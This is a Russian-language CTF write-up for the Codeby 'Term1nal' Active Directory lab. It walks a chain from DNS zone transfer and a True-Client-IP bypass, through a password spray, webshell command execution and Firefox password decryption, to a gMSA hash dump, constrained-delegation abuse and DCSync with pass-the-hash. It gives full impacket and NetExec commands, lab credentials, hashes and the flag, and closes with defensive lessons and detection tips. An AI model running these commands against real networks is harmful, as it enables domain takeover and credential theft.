# Term1nal — Codeby CTF WriteUp

**Платформа:** Codeby (Pentest Machines)  
**Сложность:** Medium    
**Цель:** 192.168.2.250  


---

## Содержание

1. [Разведка](#1-разведка)
2. [DNS Zone Transfer](#2-dns-zone-transfer)
3. [Веб-разведка и обход ограничений](#3-веб-разведка-и-обход-ограничений)
4. [Брутфорс учётной записи helpdesk](#4-брутфорс-учётной-записи-helpdesk)
5. [RCE через webshell cmd.aspx](#5-rce-через-webshell-cmdaspx)
6. [Расшифровка паролей Firefox](#6-расшифровка-паролей-firefox)
7. [Извлечение gMSA-пароля](#7-извлечение-gmsa-пароля)
8. [Constrained Delegation → Domain Admin](#8-constrained-delegation--domain-admin)
9. [Получение флага](#9-получение-флага)
10. [Альтернативный путь: DCSync через AllExtendedRights](#10-альтернативный-путь-dcsync-через-allextendedrights)

---

## 1. Разведка

### Задание

> Моя первая работа сис.админом. Просканируйте цель, найдите доменное имя и пропишите его в /etc/hosts.

### Сканирование портов

```bash
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 192.168.2.250
```

Результат показал Windows Server 2022 с ролью Domain Controller:

| Порт | Служба | Описание |
|------|--------|----------|
| 53 | DNS | Microsoft DNS |
| 88 | Kerberos | Kerberos KDC |
| 389/636 | LDAP/LDAPS | Active Directory |
| 445 | SMB | Файловые шары |
| 5985 | WinRM | PowerShell Remoting |
| 80 | HTTP | IIS (обнаружен позже) |

Из скрипта nmap извлечено:
- **Имя хоста:** DC01
- **Домен:** northstar.local
- **FQDN:** dc01.northstar.local

### Конфигурация hosts

```
192.168.2.250   dc01.northstar.local dc01 northstar.local
```

---

## 2. DNS Zone Transfer

```bash
dig @192.168.2.250 northstar.local AXFR
```

Результат:

```
northstar.local.        3600  IN  A     192.168.2.250
dc01.northstar.local.   3600  IN  A     192.168.2.250
portal.northstar.local. 3600  IN  A     192.168.2.250
```

Обнаружен виртуальный хост **portal.northstar.local** — добавлен в hosts.

**Вывод:** DNS Zone Transfer (AXFR) был разрешён без аутентификации, что позволило обнаружить скрытый поддомен. В продакшене AXFR должен быть ограничен только доверенными DNS-серверами.

---

## 3. Веб-разведка и обход ограничений

### Перечисление директорий

```bash
gobuster dir -u http://portal.northstar.local \
  -w /usr/share/wordlists/dirb/common.txt \
  -H "Host: portal.northstar.local" -t 20
```

Найдены директории:

| Путь | Код | Описание |
|------|-----|----------|
| /assets/ | 200 | Статика |
| /documents/ | 200 | Документы |
| /helpdesk/ | 200 | Хелпдеск |
| /hr/ | 200 | HR |
| /internal/ | 403 | Внутренние документы (заблокирован) |
| /status/ | 200 | Статус |

### Обход ограничения /internal/

Директория `/internal/` возвращала 403 Forbidden. Попытка обхода через заголовок доверия обратного прокси:

```bash
curl -s -H "Host: portal.northstar.local" \
     -H "True-Client-IP: 127.0.0.1" \
     http://192.168.2.250/internal/
```

Результат: **200 OK** — доступ получен.

**Вывод:** IIS/обратный прокси доверял заголовку `True-Client-IP` для определения IP клиента. Установка `127.0.0.1` заставила сервер думать, что запрос приходит с localhost. Это классическая уязвимость конфигурации — заголовки `X-Forwarded-For`, `True-Client-IP`, `X-Real-IP` должны приниматься только от доверенных прокси.

Внутри `/internal/` обнаружены подсказки о существующих учётных записях и механизме работы webshell'ов.

---

## 4. Брутфорс учётной записи helpdesk

### Перечисление пользователей через Kerberos

```bash
impacket-GetNPUsers northstar.local/ -dc-ip 192.168.2.250 \
  -usersfile users.txt -no-pass -format hashcat
```

Подтверждённые учётные записи:
- **helpdesk** — существует
- **victor** — существует
- **Администратор** — существует

### SMB Password Spray

```bash
nxc smb 192.168.2.250 -u helpdesk -p passwords.txt -d northstar.local
```

Найден пароль:

```
helpdesk : H3lpD3sk_2026!Ticket#
```

### Перечисление SMB-шар

```bash
smbclient -L //192.168.2.250 -U 'northstar.local/helpdesk%H3lpD3sk_2026!Ticket#'
```

Доступна шара **Departments** — содержит множество файлов, включая:
- `out.txt` — листинг `C:\Northstar\Web` с webshell'ами
- `profiles.txt` — листинг профиля victor
- `admin.kirbi`, `dc01.kirbi` — Kerberos-тикеты
- `efs.pfx` — EFS-сертификат
- Firefox-данные и инструменты для пентеста

---

## 5. RCE через webshell cmd.aspx

Файл `out.txt` из шары Departments содержал листинг `C:\Northstar\Web`:

```
cmd.aspx
exec.aspx
pve.aspx
pve_cve.aspx
pve_get.aspx
```

### Обнаружение параметра

```bash
# Без параметров — выводит identity IIS AppPool
curl -s -H "Host: portal.northstar.local" "http://192.168.2.250/cmd.aspx"

# Параметр c= — выполняет команды
curl -s -H "Host: portal.northstar.local" "http://192.168.2.250/cmd.aspx?c=whoami"
```

Результат:

```
iis apppool\defaultapppool
```

**RCE получен** от имени IIS Application Pool.

### Разведка файловой системы

```bash
curl -s -H "Host: portal.northstar.local" \
  "http://192.168.2.250/cmd.aspx?c=dir+C:%5CNorthstar%5CWeb"
```

В веб-корне обнаружены:
- `edge_login.db` (51 КБ) — БД логинов Edge
- `edge_aeskey.bin` (32 байта) — AES-ключ Edge
- `firefox_data.zip` (26 МБ) — данные Firefox
- `SharpDPAPI.exe`, `SharpWeb.exe` — инструменты для извлечения секретов
- Директория `_dl/` с файлами Firefox-профиля

### Содержимое _dl/

| Файл | Размер | Описание |
|------|--------|----------|
| key4.db | 294 912 | NSS-ключи Firefox (шифрование паролей) |
| logins.json | 827 | Сохранённые логины Firefox |
| cert9.db | 229 376 | Хранилище сертификатов |
| places.sqlite | 5 242 880 | История и закладки |
| cookies.sqlite | 98 304 | Куки |

---

## 6. Расшифровка паролей Firefox

### Скачивание файлов

IIS не отдаёт `.db` файлы напрямую, но в директории есть base64-версии (`.b64`/`.txt`):

```bash
# Скачиваем base64-версию key4.db (IIS отдаёт .txt файлы)
curl -s -H "Host: portal.northstar.local" \
  "http://192.168.2.250/_dl/key4_b64.txt" -o key4_b64.txt

# Декодируем (формат certutil — с BEGIN/END CERTIFICATE обёрткой)
cat key4_b64.txt | tr -d '\r' | \
  grep -v "BEGIN CERTIFICATE" | grep -v "END CERTIFICATE" | \
  base64 -d > key4.db
```

Для logins.json — читаем через webshell:

```bash
curl -s -H "Host: portal.northstar.local" \
  "http://192.168.2.250/cmd.aspx?c=type+C:%5CNorthstar%5CWeb%5C_dl%5Clogins.json"
```

### Содержимое logins.json

```json
{
  "logins": [{
    "hostname": "http://portal.northstar.local",
    "usernameField": "username",
    "passwordField": "password",
    "encryptedUsername": "MEMEEPgAAA...",
    "encryptedPassword": "MEMEEPgAAA..."
  }]
}
```

Один сохранённый логин для `portal.northstar.local`.

### Расшифровка

```bash
# Создаём фейковый профиль Firefox
mkdir -p /tmp/firefox_profile
cp key4.db logins.json cert9.db /tmp/firefox_profile/

# Клонируем инструмент
git clone https://github.com/unode/firefox_decrypt.git

# Расшифровываем
python3 firefox_decrypt/firefox_decrypt.py /tmp/firefox_profile/
```

Результат:

```
Website:   http://portal.northstar.local
Username: 'victor'
Password: 'Mustang#1967'
```

**Вывод:** Firefox хранит пароли в зашифрованном виде в `logins.json`, а мастер-ключ — в NSS-базе `key4.db`. Если мастер-пароль не установлен (по умолчанию он пуст), пароли расшифровываются без ввода пароля. Инструменты `firefox_decrypt` и `firepwd` автоматизируют этот процесс.

---

## 7. Извлечение gMSA-пароля

### Проверка учётки victor

```bash
nxc winrm 192.168.2.250 -u victor -p 'Mustang#1967' -d northstar.local
```

```
WINRM  192.168.2.250  [+] northstar.local\victor:Mustang#1967 (Pwn3d!)
```

Victor имеет доступ по WinRM (группа Remote Management Users).

### BloodHound: анализ ACL

Данные собраны через `bloodhound-python`:

```bash
bloodhound-python -u victor -p 'Mustang#1967' \
  -d northstar.local -ns 192.168.2.250 -c All
```

BloodHound выявил **два пути** от victor до Domain Admin:

**Путь A (gMSA → Constrained Delegation):**
```
victor  --[ReadGMSAPassword]-->  gmsa_svc_web$
gmsa_svc_web$  --[AllowedToDelegate]--> cifs/dc01  → Domain Admin
```

**Путь B (DCSync — прямой, более короткий):**
```
victor  --[AllExtendedRights]-->  NORTHSTAR.LOCAL (домен)
         → включает DS-Replication-Get-Changes + Get-Changes-All
         → DCSync → все хеши домена
```

Путь B — кратчайший: от victor напрямую к хешу Администратора через DCSync. Путь A — длиннее, но демонстрирует важную технику злоупотребления Constrained Delegation. Оба пути описаны ниже.

#### Путь A: gMSA → Constrained Delegation

```
victor  --[ReadGMSAPassword]-->  gmsa_svc_web$
```

**gMSA (Group Managed Service Account)** — это служебная учётная запись AD, пароль которой автоматически управляется доменом. Определённые пользователи/группы могут читать этот пароль через атрибут `msDS-ManagedPassword`.

### Извлечение хеша

```bash
python3 gMSADumper.py -u victor -p 'Mustang#1967' \
  -d northstar.local -l 192.168.2.250
```

Результат:

```
Users or groups who can read password for gmsa_svc_web$:
 > DC01$
 > victor
gmsa_svc_web$:::770a25b0a28cc9e06bfd97c9501c02a4
```

Альтернативно через NetExec:

```bash
nxc ldap 192.168.2.250 -u victor -p 'Mustang#1967' \
  -d northstar.local --gmsa
```

```
Account: gmsa_svc_web$  NTLM: 770a25b0a28cc9e06bfd97c9501c02a4
```

**Вывод:** gMSA — защищённый механизм, но если пользователь с правом `ReadGMSAPassword` скомпрометирован, атакующий получает NTLM-хеш служебной учётки. Дальше этот хеш используется в атаках Pass-the-Hash.

---

## 8. Constrained Delegation → Domain Admin

### Обнаружение делегирования

Запрос атрибутов gMSA через LDAP:

```python
import ldap3
conn = ldap3.Connection(server, 'northstar.local\\victor',
                        'Mustang#1967', authentication=ldap3.NTLM)
conn.search('DC=northstar,DC=local',
            '(sAMAccountName=gmsa_svc_web$)',
            attributes=['msDS-AllowedToDelegateTo',
                        'userAccountControl',
                        'servicePrincipalName'])
```

Результат:

```
msDS-AllowedToDelegateTo:
  HTTP/dc01
  HTTP/dc01.northstar.local
  cifs/dc01
  cifs/dc01.northstar.local

userAccountControl: 17305600
  → включает TRUSTED_TO_AUTH_FOR_DELEGATION (Protocol Transition)

servicePrincipalName:
  http/portal.northstar.local
  http/dc01.northstar.local
```

### Теория атаки

**Constrained Delegation с Protocol Transition** позволяет:

1. **S4U2Self** — gMSA запрашивает у KDC сервисный тикет *от имени любого пользователя* (например, Администратора) для себя самого. Это «имперсонация» без знания пароля целевого пользователя.

2. **S4U2Proxy** — gMSA использует полученный тикет, чтобы запросить тикет к одному из разрешённых сервисов (`msDS-AllowedToDelegateTo`). В нашем случае — `cifs/dc01`, что даёт доступ к файловой системе DC.

Флаг `TRUSTED_TO_AUTH_FOR_DELEGATION` в `userAccountControl` разрешает Protocol Transition — S4U2Self работает без предварительной аутентификации целевого пользователя.

### Выполнение атаки

```bash
impacket-getST \
  -spn 'cifs/dc01.northstar.local' \
  -impersonate 'Администратор' \
  -dc-ip 192.168.2.250 \
  'northstar.local/gmsa_svc_web$' \
  -hashes ':770a25b0a28cc9e06bfd97c9501c02a4'
```

Результат:

```
[*] Getting TGT for user
[*] Impersonating Администратор
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Администратор@cifs_dc01.northstar.local@NORTHSTAR.LOCAL.ccache
```

**Тикет получен** — теперь мы можем обращаться к `cifs/dc01` от имени Администратора домена.

---

## 9. Получение флага

### Подключение через Kerberos-тикет

```bash
export KRB5CCNAME='Администратор@cifs_dc01.northstar.local@NORTHSTAR.LOCAL.ccache'

impacket-smbclient -k -no-pass dc01.northstar.local -target-ip 192.168.2.250
```

```
# use C$
# cd Users\Администратор\Desktop
# ls
  desktop.ini
  flag.txt
  Microsoft Edge.lnk
# get flag.txt
```


## 10. Альтернативный путь: DCSync через AllExtendedRights

### Обнаружение в BloodHound

При анализе графа BloodHound обнаружено критическое право:

```
VICTOR@NORTHSTAR.LOCAL  --[AllExtendedRights]-->  NORTHSTAR.LOCAL (домен)
```

Экспорт графа BloodHound (`bh-graph-2026-10-02_09-34-18.json`):
```json
{
  "nodes": {
    "241": {"label": "VICTOR@NORTHSTAR.LOCAL", "kind": "User", "kinds": ["Tag_Owned"]},
    "242": {"label": "NORTHSTAR.LOCAL", "kind": "Domain", "kinds": ["Tag_Tier_Zero"]}
  },
  "edges": [
    {"source": "241", "target": "242", "label": "AllExtendedRights", "kind": "AllExtendedRights"}
  ]
}
```

### Теория: AllExtendedRights на домене

**AllExtendedRights** на объекте домена — это суперпривилегия, включающая:

| Расширенное право | GUID | Эффект |
|-------------------|------|--------|
| DS-Replication-Get-Changes | 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 | Чтение изменений репликации |
| DS-Replication-Get-Changes-All | 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 | Чтение секретов (пароли) |
| DS-Replication-Get-Changes-In-Filtered-Set | 89e95b76-444d-4c62-991a-0facbeda640c | Чтение отфильтрованных атрибутов |

Комбинация первых двух прав — это именно то, что нужно для **DCSync**. Атака DCSync имитирует поведение контроллера домена, запрашивающего репликацию через протокол MS-DRSR (Directory Replication Service Remote Protocol). KDC отвечает учётными данными запрошенных пользователей, включая NTLM-хеши.

### Выполнение DCSync

```bash
impacket-secretsdump 'northstar.local/victor:Mustang#1967@192.168.2.250' \
  -just-dc-user Администратор
```

Результат:

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Администратор:500:aad3b435b51404eeaad3b435b51404ee:66c7040390e370fe9219098305c1948d:::
[*] Kerberos keys grabbed
Администратор:aes256-cts-hmac-sha1-96:327cae1a4d575317ce17086f00e3063339d42dee36569222fb86265ff837453a
Администратор:aes128-cts-hmac-sha1-96:d6407b536cf355c04acb0bd40c3562b4
Администратор:des-cbc-md5:1c4904763e7fb57f
```

**NTLM-хеш Администратора получен:** `66c7040390e370fe9219098305c1948d`

### Дамп всех хешей домена

```bash
impacket-secretsdump 'northstar.local/victor:Mustang#1967@192.168.2.250' -just-dc
```

Это даст хеши **всех** пользователей домена — полная компрометация домена.

### Pass-the-Hash → Флаг

```bash
# Подключаемся к C$ с хешем Администратора
impacket-smbclient 'northstar.local/Администратор@192.168.2.250' \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:66c7040390e370fe9219098305c1948d'
```

```
# use C$
# cd Users\Администратор\Desktop
# ls
  flag.txt
# get flag.txt
```

### Сравнение двух путей

| | Путь A: gMSA + Delegation | Путь B: DCSync |
|---|---|---|
| **Шаги от victor** | 3 (gMSA dump → LDAP enum → S4U) | 1 (secretsdump) |
| **Требуемые права** | ReadGMSAPassword + gMSA has delegation | AllExtendedRights на домене |
| **Техники** | Pass-the-Hash, S4U2Self, S4U2Proxy | DCSync (MS-DRSR) |
| **Результат** | Kerberos-тикет для cifs/dc01 | NTLM-хеш любого пользователя |
| **Шумность** | Средняя (несколько Kerberos-запросов) | Высокая (репликация домена детектируется SIEM) |
| **Детекция** | Event ID 4769 (S4U), сложнее детектировать | Event ID 4662 (репликация), легко детектируется |
| **Охват** | Только сервисы из AllowedToDelegateTo | Весь домен — все хеши |

**Вывод:** DCSync — быстрее и проще, но легче обнаруживается SOC. Constrained Delegation — тише и хирургичнее, но требует больше шагов. В реальной атаке выбор зависит от модели угроз и наличия мониторинга.

---

## Полная цепочка атаки

### Общая часть (этапы 1-6)

```
Nmap scan
  │
  ▼
DNS Zone Transfer (AXFR)
  │  → обнаружен portal.northstar.local
  ▼
Web Enumeration + True-Client-IP bypass
  │  → доступ к /internal/
  ▼
Kerberos User Enumeration
  │  → подтверждены: helpdesk, victor
  ▼
SMB Password Spray
  │  → helpdesk : H3lpD3sk_2026!Ticket#
  ▼
SMB Share → Departments
  │  → out.txt → webshell'ы в C:\Northstar\Web
  ▼
Webshell cmd.aspx (?c=)
  │  → RCE как IIS AppPool
  │  → обнаружен Firefox-профиль в _dl/
  ▼
Firefox Password Decrypt
  │  → victor : Mustang#1967
  ▼
  ├─────────────────────┐
  │                     │
```

### Путь A: gMSA + Constrained Delegation

```
  │ (Путь A)
  ▼
BloodHound → victor ReadGMSAPassword → gmsa_svc_web$
  │
  ▼
gMSADumper → NTLM hash gmsa_svc_web$
  │  → 770a25b0a28cc9e06bfd97c9501c02a4
  ▼
LDAP → msDS-AllowedToDelegateTo: cifs/dc01
  │  → Constrained Delegation обнаружен
  ▼
S4U2Self + S4U2Proxy (impacket-getST)
  │  → Kerberos-тикет Администратора для cifs/dc01
  ▼
impacket-smbclient -k → C$ → Desktop\flag.txt
  │
  ▼
CODEBY{gms4_del3g4tion_le4ds_t0_d0main_@dm1n}
```

### Путь B: DCSync

```
  │ (Путь B)
  ▼
BloodHound → victor AllExtendedRights → NORTHSTAR.LOCAL
  │
  ▼
impacket-secretsdump (DCSync)
  │  → Администратор NTLM: 66c7040390e370fe9219098305c1948d
  ▼
impacket-smbclient -hashes → C$ → Desktop\flag.txt
  │
  ▼
CODEBY{gms4_del3g4tion_le4ds_t0_d0main_@dm1n}
```

---

## Использованные инструменты

| Инструмент | Назначение |
|------------|------------|
| nmap | Сканирование портов и сервисов |
| dig | DNS zone transfer |
| gobuster | Перечисление директорий |
| curl | HTTP-запросы с подменой заголовков |
| nxc (NetExec) | SMB/WinRM/LDAP атаки, gMSA dump |
| impacket-GetNPUsers | Kerberos-перечисление пользователей |
| smbclient | Доступ к SMB-шарам |
| firefox_decrypt | Расшифровка паролей Firefox |
| firepwd | Альтернативная расшифровка Firefox |
| gMSADumper.py | Извлечение gMSA-паролей |
| bloodhound-python | Сбор данных AD для BloodHound |
| BloodHound CE | Визуализация attack path в AD |
| ldap3 (Python) | LDAP-запросы атрибутов AD |
| impacket-getST | S4U2Self/S4U2Proxy (Путь A) |
| impacket-secretsdump | DCSync (Путь B) |
| impacket-smbclient | SMB с Kerberos / Pass-the-Hash |

---

## Извлечённые уроки

### Разведка и первичный доступ

1. **DNS Zone Transfer** должен быть ограничен — открытый AXFR раскрывает все записи зоны, включая скрытые поддомены.

2. **Заголовки доверия прокси** (`True-Client-IP`, `X-Forwarded-For`) не должны приниматься от внешних клиентов — только от доверенных обратных прокси.

3. **Мастер-пароль Firefox** — если не установлен (по умолчанию пуст), все сохранённые пароли извлекаются из файлов профиля. Всегда устанавливайте мастер-пароль.

### Active Directory

4. **gMSA ReadGMSAPassword** — право на чтение пароля gMSA даёт полный NTLM-хеш служебной учётки. Необходимо строго контролировать, кто имеет это право, и мониторить обращения к атрибуту `msDS-ManagedPassword` (Event ID 4662).

5. **Constrained Delegation с Protocol Transition** — самый опасный тип делегирования. Учётная запись с этим правом может имперсонировать *любого* пользователя (кроме защищённых через Protected Users или «Account is sensitive»). Делегирование на `cifs/` сервис DC фактически даёт полный доступ к файловой системе контроллера домена. Всегда проверяйте `msDS-AllowedToDelegateTo` через BloodHound.

6. **AllExtendedRights на домене** — эквивалент DCSync. Это право **никогда** не должно выдаваться обычным пользователям. Регулярный аудит ACL на объекте домена (Event ID 4662 с GUID `1131f6ad-*`) критически важен.

7. **BloodHound — must-have** — граф атак выявил оба пути эскалации, которые невозможно заметить ручным анализом отдельных ACL. Регулярный запуск BloodHound от команды защиты позволяет находить и устранять опасные пути до того, как их найдёт атакующий.
